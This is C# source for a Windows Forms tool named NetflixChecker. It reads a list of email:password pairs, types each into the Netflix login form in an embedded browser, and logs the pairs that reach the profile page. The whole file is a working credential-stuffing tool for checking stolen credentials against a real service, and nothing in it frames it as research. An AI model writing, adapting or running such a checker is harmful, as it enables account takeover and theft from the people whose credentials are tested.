using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Net;


namespace NetflixChecker
{
    public partial class Form1 : Form
    {
        bool keepGoing;
        int counter = 0;
        int location = 0;
        string publicsave, username, password, st;
        string[] accounts;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void scanner_Click(object sender, EventArgs e)
        {
            keepGoing = true;
            scanner.Enabled = false;
            button1.Enabled = true;
            timerLogin.Enabled = true;
        }
        private void adder_Click(object sender, EventArgs e)
        {
            try
            {

                string path = string.Empty;
                OpenFileDialog ofd = new OpenFileDialog();
                ofd.ShowDialog();
                path = ofd.FileName;
                accounts = File.ReadAllLines(path);
                textBox1.Text = string.Empty;
                foreach (string account in accounts)
                {
                    textBox1.Text += "\n" + account;
                }
                adder.Enabled = false;
                button2.Enabled = true;
            }
            catch (Exception)
            {

            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            textBox1.Clear();
            adder.Enabled = true;
            button2.Enabled = false;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            keepGoing = false;
            scanner.Enabled = true;
            button1.Enabled = false;
        }

        private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            string newURL = webBrowser1.Url.ToString();
            if (newURL.Contains("ProfilesGate"))
            {
                webBrowser1.Navigate("https://www.netflix.com/signout");
                textBox2.Text += Environment.NewLine + publicsave;
            }
        }
        private void login(string username, string password)
        {
            timerLogin.Enabled = false;
            if (webBrowser1.ReadyState == WebBrowserReadyState.Complete)
            {
                var emailField = webBrowser1.Document.GetElementById("email");
                var passField = webBrowser1.Document.GetElementById("password");
                var button = webBrowser1.Document.GetElementById("login-form-contBtn");
                emailField.SetAttribute("value", username);
                Thread.Sleep(10);
                passField.SetAttribute("value", password);
                Thread.Sleep(10);
                button.InvokeMember("click");
                Thread.Sleep(10);
                Console.WriteLine("im actually running");
                timerLogin.Enabled = true;
            }
            else
            {
                login(username,password);
            }
        }

        private void timerLogin_Tick(object sender, EventArgs e)
        {
            try
            {
                st = accounts[counter];
                this.Text = "Netflix Account Scanner: " + st;
                counter++;
                webBrowser1.Refresh(WebBrowserRefreshOption.Completely);
                if (string.IsNullOrEmpty(st)) return;
                else if (st.Contains('-')) return;
                else if (!keepGoing) timerLogin.Enabled = false; ;
                publicsave = st;
                location = st.IndexOf(':');
                username = st.Substring(0, location);
                password = st.Substring(location, st.Length - (location));
                password = password.Replace(':', ' ');
                password = password.Trim();
                login(username, password);
            }
            catch (Exception ee)
            {
                this.Text = "Netflix Account Scanner: " + "Finished!";
                button1.PerformClick();
                MessageBox.Show("it appears we've finished checking your accounts, thanks for using me!");
                timerLogin.Enabled = false;
            }
        }
    }
}
